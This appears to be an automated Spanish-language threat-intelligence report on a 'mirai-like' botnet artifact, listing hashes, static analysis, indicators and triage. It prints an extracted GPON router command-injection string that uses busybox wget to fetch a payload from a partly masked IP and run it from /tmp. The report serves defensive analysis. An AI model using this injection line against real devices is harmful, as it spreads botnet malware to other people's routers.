# 🧬 Payload Analysis

`7025d7b28d0c57288012703bbd17c0b8f762bebd364e77dea4648b92b45928c5`

## 📌 Resumen

Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai-like`
- **Confianza de familia:** `Media`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:01:51.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `7025d7b28d0c57288012703bbd17c0b8f762bebd364e77dea4648b92b45928c5`
- **SHA1:** `4380480af105e072f6f72a0b56910bbcfdacd91b`
- **MD5:** `dcbf4d4bc4343889d547d31991177ac6`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 301 B |
| Entropía | 5.35 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+hxxp://140.233.190.XXX/gpon+-O+/tmp/ger;sh+/tmp/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://140.233.190.XXX/gpon+-O+/tmp/ger;sh+/tmp/ger | strings |
| ip | 140.233.190.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+hxxp://140.233.190.XXX/gpon+-O+/tmp/ger;sh+/tmp/ | strings |
| hash | 7025d7b28d0c57288012703bbd17c0b8f762bebd364e77dea4648b92b45928c5 | static_analysis |
| ip | 179.130.237.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
